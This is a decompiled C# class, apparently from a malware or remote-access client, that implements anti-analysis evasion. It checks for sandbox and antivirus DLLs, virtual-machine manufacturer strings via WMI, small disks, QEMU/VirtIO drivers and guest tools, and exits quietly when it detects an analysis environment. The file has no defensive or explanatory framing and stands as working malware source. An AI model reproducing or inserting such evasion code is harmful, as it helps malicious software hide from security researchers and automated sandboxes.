using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;

namespace Client.Helper
{
	// Token: 0x02000004 RID: 4
	internal class AntiVirtual
	{
		// Token: 0x06000007 RID: 7 RVA: 0x000025CC File Offset: 0x000007CC
		public static void RunAntiAnalysis()
		{
			if (AntiVirtual.isVM_by_wim_temper() || AntiVirtual.isVM_by_wim_temper1() || AntiVirtual.Check() || AntiVirtual.CheckWMI() || AntiVirtual.SmallDiskDetected() || AntiVirtual.EnvironmentDetected())
			{
				Environment.Exit(0);
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002620 File Offset: 0x00000820
		public static bool Check()
		{
			string[] array = new string[]
			{
				EncryptString.Decode("SbieDll.dll"),
				EncryptString.Decode("snxhk.dll"),
				EncryptString.Decode("cmdvrt32.dll"),
				EncryptString.Decode("Sf2.dll"),
				EncryptString.Decode("SxIn.dll")
			};
			for (int i = 0; i < array.Length; i++)
			{
				if (DllImport.GetModuleHandleA(array[i]) != 0)
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000026A0 File Offset: 0x000008A0
		public static bool isVM_by_wim_temper()
		{
			return new ManagementObjectSearcher(new SelectQuery(EncryptString.Decode("Select * from Win32_CacheMemory"))).Get().Count == 0;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000026C4 File Offset: 0x000008C4
		public static bool isVM_by_wim_temper1()
		{
			return new ManagementObjectSearcher(new SelectQuery(EncryptString.Decode("Select * from CIM_Memory"))).Get().Count == 0;
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000026E8 File Offset: 0x000008E8
		public static bool CheckWMI()
		{
			string[] source = new string[]
			{
				EncryptString.Decode("virtual"),
				EncryptString.Decode("innotek gmbh"),
				EncryptString.Decode("tpvcgateway"),
				EncryptString.Decode("VMXh"),
				EncryptString.Decode("tpautoconnsvc"),
				EncryptString.Decode("vbox"),
				EncryptString.Decode("vmbox"),
				EncryptString.Decode("vmware"),
				EncryptString.Decode("virtualbox"),
				EncryptString.Decode("box"),
				EncryptString.Decode("thinapp")
			};
			try
			{
				ManagementObject managementObject = (from p in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_ComputerSystem").Get().OfType<ManagementObject>()
				where p != null
				select p).FirstOrDefault<ManagementObject>();
				if (managementObject[EncryptString.Decode("Model")] != null && source.Contains(managementObject[EncryptString.Decode("Model")].ToString().ToLower()))
				{
					return true;
				}
				if (managementObject[EncryptString.Decode("Manufacturer")] != null && source.Contains(managementObject[EncryptString.Decode("Manufacturer")].ToString().ToLower()))
				{
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002874 File Offset: 0x00000A74
		public static bool SmallDiskDetected()
		{
			bool result;
			try
			{
				long num = AntiVirtual.GetTotalSize(Path.GetPathRoot(Environment.SystemDirectory).Substring(0, 1)) / 1000000000L;
				long num2 = 45L;
				result = (num < num2);
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600000D RID: 13 RVA: 0x000028C4 File Offset: 0x00000AC4
		public static long GetTotalSize(string driveLetter)
		{
			long num = 0L;
			long result = 0L;
			long num2 = 0L;
			DllImport.GetDiskFreeSpaceEx(driveLetter + EncryptString.Decode(":\\"), ref num, ref result, ref num2);
			return result;
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000028FC File Offset: 0x00000AFC
		public static bool EnvironmentDetected()
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), EncryptString.Decode("drivers"));
			foreach (string path2 in new string[]
			{
				EncryptString.Decode("balloon.sys"),
				EncryptString.Decode("netkvm.sys"),
				EncryptString.Decode("pvpanic.sys"),
				EncryptString.Decode("viofs.sys"),
				EncryptString.Decode("viofs.sys"),
				EncryptString.Decode("viogpudo.sys"),
				EncryptString.Decode("vioinput.sys"),
				EncryptString.Decode("viorng.sys"),
				EncryptString.Decode("vioser.sys"),
				EncryptString.Decode("viostor.sys")
			})
			{
				if (File.Exists(Path.Combine(path, path2)))
				{
					return true;
				}
			}
			string path3 = Path.Combine(new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
			});
			foreach (string path4 in new string[]
			{
				EncryptString.Decode("qemu-ga"),
				EncryptString.Decode("SPICE Guest Tools")
			})
			{
				if (Directory.Exists(Path.Combine(path3, path4)))
				{
					return true;
				}
			}
			return Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName).ToLower().Contains(EncryptString.Decode("sandbox"));
		}
	}
}
